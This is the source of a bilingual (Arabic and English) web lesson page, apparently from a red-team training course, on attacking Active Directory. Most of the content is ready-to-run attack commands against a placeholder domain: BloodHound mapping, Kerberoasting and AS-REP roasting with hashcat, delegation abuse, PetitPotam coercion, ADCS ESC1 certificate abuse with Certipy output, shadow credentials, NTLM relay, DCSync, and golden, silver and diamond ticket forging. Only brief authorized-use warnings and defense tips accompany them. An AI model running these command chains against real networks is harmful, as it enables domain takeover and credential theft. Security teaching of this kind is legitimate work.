"use client";
import { LessonShell, Section, Callout, Code, Terminal, Analogy, L } from "@/components/LessonShell";

export default function Page() {
  return (
    <LessonShell slug="advanced-ad">
      <L
        ar={<>
          <Section title="لماذا Active Directory هو الجائزة الكبرى؟">
            <Analogy>الـ Domain Controller هو مفتاح المملكة. من يملك صلاحية Domain Admin أو krbtgt يملك كل الأجهزة و كل الحسابات في المؤسسة. هذا الدرس عن الطرق الحديثة للوصول لذلك المفتاح.</Analogy>
            <Callout kind="danger" title="تحذير">كل التقنيات هنا مذكورة لتمارين red team مصرّح بها فقط. استخدامها بدون تفويض = جريمة فيدرالية في كل دول مجلس التعاون و الاتحاد الأوروبي و الولايات المتحدة.</Callout>
          </Section>
          <Section title="رسم شجرة الهجوم بـ BloodHound">
            <p>أول ما يفعله red teamer داخل الدومين هو رسم خريطة العلاقات. BloodHound + SharpHound يجمعان كل ACLs, sessions, group memberships ثم يحوّلانها إلى رسم بياني.</p>
            <Terminal lines={[
              { p: "bloodhound-python -d corp.local -u user -p Pass1 -ns 10.0.0.10 -c All --zip" },
              { p: "Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -ZipFileName loot.zip" },
              { o: "[+] 1247 users, 92 computers, 38 GPOs collected" },
            ]} />
            <h3>استعلامات Cypher مفيدة</h3>
            <Code lang="Cypher">{`MATCH p=shortestPath((u:User {name:"ME@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
MATCH (u:User {hasspn:true}) WHERE u.pwdlastset < (date().epochSeconds - 31536000) RETURN u.name
MATCH (u)-[:GenericAll|WriteOwner|WriteDacl]->(t) RETURN u,t`}</Code>
          </Section>
          <Section title="Kerberos Attacks الكاملة">
            <h3>1) Kerberoasting</h3>
            <Code lang="bash">{`GetUserSPNs.py corp.local/user:Pass1 -dc-ip 10.0.0.10 -request -outputfile spns.hash
hashcat -m 13100 spns.hash rockyou.txt -r rules/best64.rule`}</Code>
            <h3>2) AS-REP Roasting</h3>
            <Code lang="bash">{`GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10
hashcat -m 18200 asrep.hash rockyou.txt`}</Code>
            <h3>3) Unconstrained Delegation</h3>
            <Code lang="bash">{`Rubeus.exe monitor /interval:1 /nowrap
SpoolSample.exe DC1 PWNED-HOST
PetitPotam.py -d corp.local -u user -p Pass1 PWNED DC1`}</Code>
            <h3>4) Constrained Delegation Abuse (S4U)</h3>
            <Code lang="bash">{`getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/svc:Pass1
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local`}</Code>
            <h3>5) Resource-Based Constrained Delegation (RBCD)</h3>
            <Code lang="bash">{`rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write corp.local/user:Pass1
addcomputer.py corp.local/user:Pass1 -computer-name FAKE$ -computer-pass Fake1
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/FAKE$:Fake1`}</Code>
          </Section>
          <Section title="ADCS — أحدث جبهة و أخطرها (ESC1 → ESC15)">
            <p>Active Directory Certificate Services فيه قوالب شهادات يمكن إساءة تكوينها. أداة Certipy تكتشف و تستغل تلقائياً.</p>
            <Terminal lines={[
              { p: "certipy find -u user@corp.local -p Pass1 -dc-ip 10.0.0.10 -vulnerable -stdout" },
              { o: "[!] Vulnerable: VulnTemplate (ESC1) — ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU" },
              { p: "certipy req -u user@corp.local -p Pass1 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local" },
              { o: "[+] Got certificate for administrator@corp.local — saved as administrator.pfx" },
              { p: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10" },
              { o: "[+] Got TGT and NT hash for administrator: aad3b435...:31d6cfe0d16ae..." },
            ]} />
            <h3>الـ ESC الأشهر</h3>
            <ul>
              <li><b>ESC1</b> — قالب يسمح بـ SAN + Client Authentication.</li>
              <li><b>ESC2</b> — Any Purpose EKU أو خالٍ.</li>
              <li><b>ESC4</b> — GenericAll على القالب نفسه = استبدله بقالب ضعيف.</li>
              <li><b>ESC8</b> — NTLM relay إلى الـ CA web enrollment.</li>
              <li><b>ESC11</b> — RPC interface بدون EPA.</li>
              <li><b>ESC13/15</b> — حديثة، تتعلق بـ issuance policies / schema.</li>
            </ul>
          </Section>
          <Section title="Shadow Credentials">
            <p>لو كان لديك GenericWrite على حساب، يمكنك إضافة مفتاح msDS-KeyCredentialLink ثم المصادقة كهذا الحساب بـ PKINIT دون كسر كلمة مروره.</p>
            <Code lang="bash">{`certipy shadow auto -u user@corp.local -p Pass1 -account victim`}</Code>
          </Section>
          <Section title="NTLM Relay — هجوم لا يموت">
            <Code lang="bash">{`responder -I eth0 -wrf
ntlmrelayx.py -t ldaps://dc -smb2support --delegate-access
ntlmrelayx.py -t ldap://dc --shadow-credentials --shadow-target victim$
mitm6 -d corp.local
ntlmrelayx.py -6 -wh fake-wpad -t ldaps://dc --delegate-access`}</Code>
            <Callout kind="good" title="الدفاع">
              <ul>
                <li>فعّل SMB Signing + LDAP Signing &amp; Channel Binding (EPA).</li>
                <li>عطّل LLMNR / NBT-NS / mDNS.</li>
                <li>عطّل IPv6 إن لم يُستخدم، أو ثبّت DHCPv6 guard.</li>
                <li>راقب 4624 type 3 + 4768/4769 غير المعتاد.</li>
              </ul>
            </Callout>
          </Section>
          <Section title="DCSync و Golden / Silver / Diamond Tickets">
            <Code lang="bash">{`secretsdump.py -just-dc corp.local/admin:Pass1@DC1
ticketer.py -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-... -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC1
ticketer.py -nthash <SVC_NTLM> -spn cifs/target -domain corp.local user
Rubeus.exe diamond /tgtdeleg /ticketuser:admin /ticketuserid:500 /groups:512`}</Code>
            <Callout kind="warn" title="القاعدة الذهبية للدفاع">عند تأكيد اختراق DC: <b>دوّر krbtgt مرتين</b> (مرة، انتظر 10 ساعات، مرة أخرى).</Callout>
          </Section>
        </>}
        en={<>
          <Section title="Why is Active Directory the crown jewel?">
            <Analogy>The Domain Controller is the master key. Whoever owns Domain Admin or krbtgt owns every machine and account in the org. This lesson is about modern paths to that key.</Analogy>
            <Callout kind="danger" title="Warning">Every technique here is for authorized red team engagements only. Unauthorized use is a federal offense in GCC, EU, and US jurisdictions.</Callout>
          </Section>
          <Section title="Mapping the attack tree with BloodHound">
            <p>The first thing a red teamer does inside a domain is map relationships. BloodHound + SharpHound collect all ACLs, sessions, and group memberships, then graph them.</p>
            <Terminal lines={[
              { p: "bloodhound-python -d corp.local -u user -p Pass1 -ns 10.0.0.10 -c All --zip" },
              { p: "Invoke-BloodHound -CollectionMethod All,LoggedOn,GPOLocalGroup -ZipFileName loot.zip" },
              { o: "[+] 1247 users, 92 computers, 38 GPOs collected" },
            ]} />
            <h3>Useful Cypher queries</h3>
            <Code lang="Cypher">{`MATCH p=shortestPath((u:User {name:"ME@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p
MATCH (u:User {hasspn:true}) WHERE u.pwdlastset < (date().epochSeconds - 31536000) RETURN u.name
MATCH (u)-[:GenericAll|WriteOwner|WriteDacl]->(t) RETURN u,t`}</Code>
          </Section>
          <Section title="Full Kerberos attack arsenal">
            <h3>1) Kerberoasting</h3>
            <Code lang="bash">{`GetUserSPNs.py corp.local/user:Pass1 -dc-ip 10.0.0.10 -request -outputfile spns.hash
hashcat -m 13100 spns.hash rockyou.txt -r rules/best64.rule`}</Code>
            <h3>2) AS-REP Roasting</h3>
            <Code lang="bash">{`GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10
hashcat -m 18200 asrep.hash rockyou.txt`}</Code>
            <h3>3) Unconstrained Delegation</h3>
            <Code lang="bash">{`Rubeus.exe monitor /interval:1 /nowrap
SpoolSample.exe DC1 PWNED-HOST
PetitPotam.py -d corp.local -u user -p Pass1 PWNED DC1`}</Code>
            <h3>4) Constrained Delegation Abuse (S4U)</h3>
            <Code lang="bash">{`getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/svc:Pass1
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.local/Administrator@target.corp.local`}</Code>
            <h3>5) Resource-Based Constrained Delegation (RBCD)</h3>
            <Code lang="bash">{`rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ -action write corp.local/user:Pass1
addcomputer.py corp.local/user:Pass1 -computer-name FAKE$ -computer-pass Fake1
getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/FAKE$:Fake1`}</Code>
          </Section>
          <Section title="ADCS — the newest and most dangerous frontier (ESC1 → ESC15)">
            <p>Active Directory Certificate Services has certificate templates that are easy to misconfigure. Certipy detects and exploits them automatically.</p>
            <Terminal lines={[
              { p: "certipy find -u user@corp.local -p Pass1 -dc-ip 10.0.0.10 -vulnerable -stdout" },
              { o: "[!] Vulnerable: VulnTemplate (ESC1) — ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU" },
              { p: "certipy req -u user@corp.local -p Pass1 -ca CORP-CA -template VulnTemplate -upn administrator@corp.local" },
              { o: "[+] Got certificate for administrator@corp.local — saved as administrator.pfx" },
              { p: "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10" },
              { o: "[+] Got TGT and NT hash for administrator: aad3b435...:31d6cfe0d16ae..." },
            ]} />
            <h3>The most common ESC paths</h3>
            <ul>
              <li><b>ESC1</b> — template allows SAN + Client Authentication.</li>
              <li><b>ESC2</b> — Any Purpose EKU or empty EKU.</li>
              <li><b>ESC4</b> — GenericAll over the template itself = swap it for a vulnerable one.</li>
              <li><b>ESC8</b> — NTLM relay to the CA web enrollment.</li>
              <li><b>ESC11</b> — RPC interface without EPA.</li>
              <li><b>ESC13/15</b> — newer, around issuance policies / schema.</li>
            </ul>
          </Section>
          <Section title="Shadow Credentials">
            <p>If you have GenericWrite on an account, you can add an msDS-KeyCredentialLink and authenticate as that account via PKINIT — no password cracking needed.</p>
            <Code lang="bash">{`certipy shadow auto -u user@corp.local -p Pass1 -account victim`}</Code>
          </Section>
          <Section title="NTLM Relay — the attack that won't die">
            <Code lang="bash">{`responder -I eth0 -wrf
ntlmrelayx.py -t ldaps://dc -smb2support --delegate-access
ntlmrelayx.py -t ldap://dc --shadow-credentials --shadow-target victim$
mitm6 -d corp.local
ntlmrelayx.py -6 -wh fake-wpad -t ldaps://dc --delegate-access`}</Code>
            <Callout kind="good" title="Defense">
              <ul>
                <li>Enforce SMB Signing + LDAP Signing &amp; Channel Binding (EPA).</li>
                <li>Disable LLMNR / NBT-NS / mDNS.</li>
                <li>Disable IPv6 if unused, or deploy DHCPv6 guard.</li>
                <li>Monitor abnormal 4624 type 3 + 4768/4769 events.</li>
              </ul>
            </Callout>
          </Section>
          <Section title="DCSync and Golden / Silver / Diamond Tickets">
            <Code lang="bash">{`secretsdump.py -just-dc corp.local/admin:Pass1@DC1
ticketer.py -nthash <KRBTGT_NTLM> -domain-sid S-1-5-21-... -domain corp.local administrator
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass corp.local/administrator@DC1
ticketer.py -nthash <SVC_NTLM> -spn cifs/target -domain corp.local user
Rubeus.exe diamond /tgtdeleg /ticketuser:admin /ticketuserid:500 /groups:512`}</Code>
            <Callout kind="warn" title="The defender's golden rule">After confirmed DC compromise: <b>rotate krbtgt twice</b> (rotate, wait 10 hours, rotate again). One rotation is not enough.</Callout>
          </Section>
        </>}
      />
    </LessonShell>
  );
}
